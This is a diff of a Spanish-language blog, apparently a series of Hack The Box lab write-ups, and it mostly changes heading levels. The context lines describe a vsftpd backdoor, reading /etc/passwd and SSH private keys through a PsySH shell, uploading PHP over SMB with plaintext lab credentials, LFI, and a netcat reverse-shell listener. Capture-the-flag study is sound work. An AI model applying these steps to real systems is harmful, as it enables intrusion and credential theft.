+&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;Encontramos ftp en su version &lt;code&gt;vftpd 2.3.4&lt;/code&gt; el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de &lt;code&gt;Psy Shell&lt;/code&gt;, intentamos conectarnos al &lt;code&gt;puerto 6200&lt;/code&gt;, y encontramos una shell de Psysh,y con el comando dir la clase &lt;code&gt;$tokyo&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/&#34;&gt;&lt;em&gt;Expliting Vsftpd&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/In2econd/vsftpd-2.3.4-exploit&#34;&gt;&lt;em&gt;Github - Exploit&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
@@ -6073,7 +6073,7 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2002.10.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Asi es como obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;, ahora que sabemos como descargar archivos vamos a descargar el &lt;code&gt;id_rsa&lt;/code&gt; (&lt;code&gt;../.ssh/id_rsa&lt;/code&gt;) del usuario &lt;code&gt;berlin&lt;/code&gt; y asi conectarnos mediante el servicio ssh.&lt;/p&gt;
 &lt;p&gt;Por alguna razon el &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;berlin&lt;/code&gt; no funciona en si mismo, funciona con el usuario &lt;code&gt;professor&lt;/code&gt; y &lt;code&gt;dali&lt;/code&gt;. En el caso de dali debemos de agregar nuestra clave al archivo &lt;code&gt;authorized_keys&lt;/code&gt; mediante &lt;code&gt;PSYSH&lt;/code&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;usuario-dali-psysh-&#34;&gt;USUARIO DALI PSYSH&lt;/h2&gt;
+&lt;h1 id=&#34;usuario-dali-psysh&#34;&gt;USUARIO DALI PSYSH&lt;/h1&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.sitepoint.com/interactive-php-debugging-psysh/&#34;&gt;&lt;em&gt;Debugging Psysh&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Utilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;$file = file_get_contents(&#39;/etc/passwd&#39;);echo $file;
@@ -6095,13 +6095,13 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.31.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Ahora nos conectamos con la clave de &amp;lsquo;berlin&amp;rsquo;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.27.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;usuario-professor---ssh-&#34;&gt;USUARIO PROFESSOR - SSH&lt;/h2&gt;
+&lt;h1 id=&#34;usuario-professor---ssh&#34;&gt;USUARIO PROFESSOR - SSH&lt;/h1&gt;
 &lt;p&gt;Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.29.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---flag-&#34;&gt;USER - FLAG&lt;/h2&gt;
+&lt;h2 id=&#34;user---flag&#34;&gt;USER - FLAG&lt;/h2&gt;
 &lt;p&gt;Al enumerar las carpetas de los usuarios encontramos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt; en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.38.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Utilizamos pspy64 para ver los crons que se ejecutan.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.52.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Encontramos un proceso que se ejecuta que utiliza node y un archivo &lt;code&gt;memcached.js&lt;/code&gt;.&lt;br /&gt;
@@ -6191,7 +6191,7 @@ command = sudo -u root sh /tmp/batman.sh
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -6223,7 +6223,7 @@ command = sudo -u root sh /tmp/batman.sh
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos con nmap.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -6263,8 +6263,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 46.20 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;Haciendo un login como usuario anonimo no encontramos nada en este puerto.&lt;/p&gt;
+&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;h2 id=&#34;enum-http-&#34;&gt;ENUM HTTP&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -6470,12 +6471,12 @@ hr.friendzone.red
 uploads.friendzone.red
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;enumerando-directorios-https---friendzonered&#34;&gt;ENUMERANDO DIRECTORIOS HTTPS -&amp;gt; friendzone.red&lt;/h3&gt;
-&lt;h4 id=&#34;httpsfriendzonered&#34;&gt;&lt;a href=&#34;https://friendzone.red/&#34;&gt;https://friendzone.red/&lt;/a&gt;&lt;/h4&gt;
+&lt;/div&gt;&lt;h2 id=&#34;enumerando-directorios-https---friendzonered&#34;&gt;ENUMERANDO DIRECTORIOS HTTPS -&amp;gt; friendzone.red&lt;/h2&gt;
+&lt;h3 id=&#34;httpsfriendzonered&#34;&gt;&lt;a href=&#34;https://friendzone.red/&#34;&gt;https://friendzone.red/&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_002853.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;/js/js/&lt;/em&gt;&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_003018.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;httpsuploadsfriendzonered-&#34;&gt;&lt;a href=&#34;https://uploads.friendzone.red&#34;&gt;https://uploads.friendzone.red&lt;/a&gt;&lt;/h4&gt;
+&lt;h3 id=&#34;httpsuploadsfriendzonered&#34;&gt;&lt;a href=&#34;https://uploads.friendzone.red&#34;&gt;https://uploads.friendzone.red&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_160704.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -6489,9 +6490,9 @@ uploads.friendzone.red
 /upload.php
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;httpshrfriendzonered-&#34;&gt;&lt;a href=&#34;https://hr.friendzone.red&#34;&gt;https://hr.friendzone.red&lt;/a&gt;&lt;/h4&gt;
+&lt;/div&gt;&lt;h3 id=&#34;httpshrfriendzonered&#34;&gt;&lt;a href=&#34;https://hr.friendzone.red&#34;&gt;https://hr.friendzone.red&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;EMPTY&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&#34;httpsadministrator1friendzonered-&#34;&gt;&lt;a href=&#34;https://administrator1.friendzone.red&#34;&gt;https://administrator1.friendzone.red&lt;/a&gt;&lt;/h4&gt;
+&lt;h3 id=&#34;httpsadministrator1friendzonered&#34;&gt;&lt;a href=&#34;https://administrator1.friendzone.red&#34;&gt;https://administrator1.friendzone.red&lt;/a&gt;&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -6506,7 +6507,7 @@ uploads.friendzone.red
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://www.securityartwork.es/2010/12/22/recopilacion-local-file-inclusion-lfi/&#34;&gt;&lt;em&gt;LFI - Securityartwork&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://xapax.gitbooks.io/security/content/local_file_inclusion.html&#34;&gt;&lt;em&gt;LFI - xapax&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h4 id=&#34;httpsadministrator1friendzonered--1&#34;&gt;&lt;a href=&#34;https://administrator1.friendzone.red/&#34;&gt;https://administrator1.friendzone.red/&lt;/a&gt;&lt;/h4&gt;
+&lt;h3 id=&#34;httpsadministrator1friendzonered-1&#34;&gt;&lt;a href=&#34;https://administrator1.friendzone.red/&#34;&gt;https://administrator1.friendzone.red/&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;En el primer subdominio econtramos un login y utilizando las credenciales nos muestra un mensaje, donde nos indica que para mostrar la imagen del script debemos de insertar lo siguiente: &lt;code&gt;?image_id=a.jpg&amp;amp;pagename=timestamp&lt;/code&gt;&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190211_234815.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
 Al realizar dicho request a la pagina obtenemos la imagen y lo que parece el tiempo en que se ejecuto el programa.&lt;br /&gt;
@@ -6637,7 +6638,7 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;obteniendo-acceso-&#34;&gt;OBTENIENDO ACCESO&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;obteniendo-acceso&#34;&gt;OBTENIENDO ACCESO&lt;/h1&gt;
 &lt;p&gt;Anteriormente pudimos obtener el codigo fuente de las paginas locales y accesso a dos de los sharenames disponibles en el servicio de samba, pero en uno de ellos nos indica que la carpeta local del sharename &lt;code&gt;Files&lt;/code&gt; es en &lt;code&gt;/etc/Files&lt;/code&gt; por lo que concluimos que &lt;code&gt;Development y general&lt;/code&gt; estan en la carpeta &lt;code&gt;/etc/Development&lt;/code&gt; y &lt;code&gt;/etc/general&lt;/code&gt;, de los cuales solo tenemos acceso a &lt;code&gt;Development&lt;/code&gt;, procedemos a subir un archivo en samba con el sharename &lt;code&gt;Development&lt;/code&gt; y hacer una solicitud a la carpeta &lt;code&gt;/etc/Development/NuestroArchivo&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;*batman.php*&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -6648,7 +6649,7 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;echo &amp;#39;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/center&amp;gt;&amp;lt;h1&amp;gt;Yo soy Batman&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;#39; &amp;gt; batman.php
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;smbclient-&#34;&gt;Smbclient&lt;/h3&gt;
+&lt;/div&gt;&lt;h2 id=&#34;smbclient&#34;&gt;Smbclient&lt;/h2&gt;
 &lt;pre&gt;&lt;code&gt;smbclient \\\\10.10.10.123\\Development --user=admin WORKWORKHhallelujah@#
 Try &amp;quot;help&amp;quot; to get a list of possible commands.
 smb: \&amp;gt; put batman.php
@@ -6671,12 +6672,12 @@ put batman_sh.php
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_191406.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;nc -lvp 7878
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_192037.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user-flag-&#34;&gt;USER Flag&lt;/h2&gt;
+&lt;h1 id=&#34;user-flag&#34;&gt;USER Flag&lt;/h1&gt;
 &lt;p&gt;Para el user flag solo falto un poco de enumeracion en los archivos locales y en la configuracion de la base de datos mysql del servidor encontramos un usuario y contraseña de un usuario.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_192437.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;ssh friend@10.10.10.123
 Password: Agpyu12!0.213$
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;root-shell-&#34;&gt;ROOT SHELL&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;root-shell&#34;&gt;ROOT SHELL&lt;/h1&gt;
 &lt;p&gt;Utilizando pspy para encontrar tareas que se ejecutan como usuario root logramos ver una que se encuentra dentro de la carpeta &lt;code&gt;/opt&lt;/code&gt;, es un script escrito en python llamado &lt;code&gt;reporter.py&lt;/code&gt;, el cual tiene permisos root, dentro del script podemos ver que importa la libreria os e imprime algunos mensajes.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/DominicBreuker/pspy/&#34;&gt;&lt;em&gt;Github - pspy&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190214_144430.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -6853,7 +6854,7 @@ Password: Agpyu12!0.213$
   &lt;/div&gt;
 
 &lt;hr /&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos TCP&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -6904,7 +6905,7 @@ OS and Service detection performed. Please report any incorrect results at https
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;hr /&gt;
-&lt;h2 id=&#34;gobuste-&#34;&gt;GOBUSTE&lt;/h2&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -6938,7 +6939,7 @@ OS and Service detection performed. Please report any incorrect results at https
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;hr /&gt;
-&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Pagina Principal&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2015.55.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;moodle-&#34;&gt;/Moodle&lt;/h3&gt;
@@ -6961,7 +6962,7 @@ OS and Service detection performed. Please report any incorrect results at https
 &lt;p&gt;Vamos a utilizar burpsuite para encontrar el caracter faltante de la contraseña, utilizando el login de moodle. Para los caracteres utilizamos &lt;code&gt;/usr/share/wordlists/dirb/stress/alphanum_case_extra.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Encontramos que el caracter faltante para la contraseña es &lt;code&gt;#&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.22.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;moodle--1&#34;&gt;Moodle&lt;/h3&gt;
+&lt;h1 id=&#34;moodle&#34;&gt;Moodle&lt;/h1&gt;
 &lt;p&gt;Utilizando las credenciales &lt;code&gt;Giovanni&lt;/code&gt; y &lt;code&gt;Th4C00lTheacha#&lt;/code&gt; logramos ingresar a Moodle.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.23.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;hr /&gt;
@@ -6971,7 +6972,7 @@ OS and Service detection performed. Please report any incorrect results at https
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Peek%202019-04-18%2016-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Obtenemos una shell como &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;user---giovanni-&#34;&gt;USER - Giovanni&lt;/h2&gt;
+&lt;h1 id=&#34;user---giovanni&#34;&gt;USER - Giovanni&lt;/h1&gt;
 &lt;p&gt;Revisamos los archivos de configuracion para posibles contraseñas de base de datos y encontramos las credenciales de una base de datos en el archivo de configuracion de moodle.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.52.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -7038,7 +7039,7 @@ $CFG-&amp;gt;dboptions = array (
 &lt;p&gt;Utilizamos la contraseña con el usuario &lt;code&gt;Giovanni&lt;/code&gt; y obtenemos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.00.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;root---flag-&#34;&gt;ROOT - flag&lt;/h2&gt;
+&lt;h1 id=&#34;root---flag&#34;&gt;ROOT - flag&lt;/h1&gt;
 &lt;p&gt;Utilizamos pspy para ver los cron que se ejecutan y encontramos un archivo que se ejecuta cada minuto y realiza un backup de la carpeta courses en el directorio de &lt;code&gt;Giovanni&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.08.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
